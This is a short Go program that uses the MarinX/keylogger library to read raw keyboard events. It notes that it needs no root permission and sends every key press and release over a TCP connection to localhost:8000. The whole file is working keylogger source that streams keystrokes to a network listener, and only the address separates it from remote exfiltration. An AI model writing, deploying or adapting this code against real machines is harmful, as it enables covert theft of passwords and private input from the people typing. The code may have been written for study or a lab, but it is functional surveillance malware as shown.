package main

import (
	"net"

	"github.com/MarinX/keylogger"
	"github.com/sirupsen/logrus"
)

func main() {

	// find keyboard device, does not require a root permission
	keyboard := keylogger.FindKeyboardDevice()

	// check if we found a path to keyboard
	if len(keyboard) <= 0 {
		logrus.Error("No keyboard found...you will need to provide manual input path")
		return
	}

	logrus.Println("Found a keyboard at", keyboard)
	// init keylogger with keyboard

	conn, err := net.Dial("tcp", "localhost:8000")
	if err != nil {
		panic(err)
	}

	k, err := keylogger.New(keyboard)
	if err != nil {
		logrus.Error(err)
		return
	}
	defer k.Close()
	events := k.Read()

	// range of events
	for e := range events {
		switch e.Type {
		case keylogger.EvKey:

			// if the state of key is pressed
			if e.KeyPress() {
				logrus.Println("[event] press key ", e.KeyString())
				conn.Write([]byte("[event] press key " + e.KeyString()))
			}

			// if the state of key is released
			if e.KeyRelease() {
				logrus.Println("[event] release key ", e.KeyString())

				conn.Write([]byte("[event] release key " + e.KeyString()))
			}

			break
		}
	}
}
